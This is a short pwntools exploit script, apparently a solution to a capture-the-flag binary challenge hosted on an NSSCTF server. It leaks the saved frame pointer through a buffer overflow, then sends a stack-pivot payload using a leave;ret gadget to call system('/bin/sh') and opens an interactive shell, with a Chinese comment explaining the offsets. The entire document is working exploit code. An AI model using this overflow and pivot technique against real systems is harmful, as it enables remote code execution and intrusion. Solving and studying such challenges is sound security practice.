from pwn import *

# io = process("./pwn2")
io = remote("node5.anna.nssctf.cn", 23550)
elf = ELF("./pwn2")

system_plt = elf.plt["system"]
leave_ret = 0x8048562

payload = b"a" * 0x27 + b"B"
io.send(payload)
io.recvuntil(b"B")
old_ebp = u32(io.recv(4))
print("old ebp address: ", hex(old_ebp))
payload = b"aaaa" + p32(system_plt) + b"aaaa" + p32(old_ebp - 0x28) + b"/bin/sh\x00"
payload = payload.ljust(0x28, b"\x00")
payload += p32(old_ebp - 0x38) + p32(leave_ret)
"""
old ebp - 0x38 刚好是 buf 的位置
old ebp - 0x28 是填充 0x10 后的位置，
"""
io.send(payload)
io.interactive()
